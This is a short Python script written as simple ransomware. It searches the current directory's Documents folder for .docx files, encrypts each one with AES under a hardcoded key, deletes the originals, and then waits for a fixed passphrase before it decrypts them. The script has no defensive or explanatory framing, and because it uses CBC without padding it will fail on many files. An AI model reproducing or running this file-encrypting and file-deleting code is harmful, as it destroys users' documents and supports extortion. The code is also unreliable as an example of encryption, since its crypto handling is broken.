from pathlib import Path
from Crypto.Cipher import AES
import os

key = b"Sixteen byte key"
iv = os.urandom(16)
def encrypt(data):
    cipher = AES.new(key,AES.MODE_CBC,iv)
    return cipher.encrypt(data)

def decrypt(data): 
    cipher = AES.new(key,AES.MODE_CBC,iv)
    return cipher.decrypt(data)

def encryptFile(path):
    with open(str(path),"rb") as f:
        data = f.read()
    with open(str(path)+".encrypted","wb") as f:
        f.write(encrypt(data))
    os.remove(str(path))

def decryptFile(path):
    with open(str(path)+".encrypted","rb") as f:
        data = f.read()
    with open(str(path),"wb") as f:
        f.write(decrypt(data))
    os.remove(str(path)+".encrypted")

def getFiles(directory,ext):
    paths = list(Path(directory).rglob("*"+ext))
    return paths


directory = os.path.join(os.getcwd(),"Documents")
print(directory)
ext = ".docx"
paths = getFiles(directory,ext)
for path in paths:
    encryptFile(path)

while(True):
    print("Enter decryption code: ")
    code = input().rstrip()
    if code == "Decrypt files":
        for path in paths:
            decryptFile(path)
        break